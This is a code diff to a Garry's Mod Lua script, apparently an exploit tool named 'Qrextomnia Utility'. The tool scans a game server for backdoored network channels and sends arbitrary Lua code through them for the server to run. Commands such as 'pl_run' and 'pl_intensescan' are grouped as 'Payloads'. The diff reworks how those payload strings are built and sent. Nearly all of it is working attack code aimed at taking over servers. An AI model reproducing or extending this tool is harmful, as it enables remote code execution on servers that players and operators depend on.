@@ -1,6 +1,6 @@
 local prefix = "qrex"
 local channel = ""
-local lPlayer = LocalPlayer():SteamID64()
+local lPlayer = LocalPlayer():EntIndex()
 local vulChannel = {}
 local commands = {}
 local exploits = {}
@@ -40,23 +40,28 @@ for k,v in pairs(bdChannels) do
 end
 
 local function luaRun(ply, cmd, args)
+if(channel == "") then MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.") return end
 if(!args[1]) then return end
-  local arg1 = args[1]
-  local arg1 = string.Trim(arg1)
+local run = table.concat(args, " ")
+PrintTable(args)
   net.Start(channel)
-	net.WriteString( arg1 )
+	net.WriteString(run)
 	net.SendToServer()
+  print(run)
 end
 
 local function luaRunOnLocal(ply, cmd, args)
+if(channel == "") then MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.") return end
 if(!args[1]) then return end
-  local arg1 = args[1]
-  local arg1 = string.Trim(arg1)
+local run = table.concat(args)
+PrintTable(args)
+  local run = "player.GetByID("..lPlayer.."):"..run
+
   net.Start(channel)
-	net.WriteString([[player.GetBySteamID("]]..tostring(lPlayer)..[["):]]..arg1)
+	net.WriteString(run)
 	net.SendToServer()
 
-  print("player.GetBySteamID64('"..lPlayer.."'):"..arg1)
+  print(run)
 end
 
 local function setTarget(ply, cmd, args)
@@ -92,10 +97,14 @@ local function addExploit(channel)
 
 end
 
+local function testFunction()
+  print(string.Replace([[print("test")]],[["]],"'"))
+end
+
 local function init()
 MsgC(Color(166, 222, 255), "Qrextomnia Utility has successfully initialized!\nType "..prefix.."_help for a list of commands")
 
-addCommand("print", "Test", "Utility", function() print("testxd") end)
+addCommand("test", "Test", "Utility", testFunction)
 addCommand("help", "Shows you a list of commands and their description.", "Help", help)
 addCommand("pl_intensescan", "Launches an intense scan on the server (This can be risky due to discarding net messages).", "Payloads", intenseScan)
 addCommand("pl_run", "Sends function to selected channel.", "Payloads", luaRun)
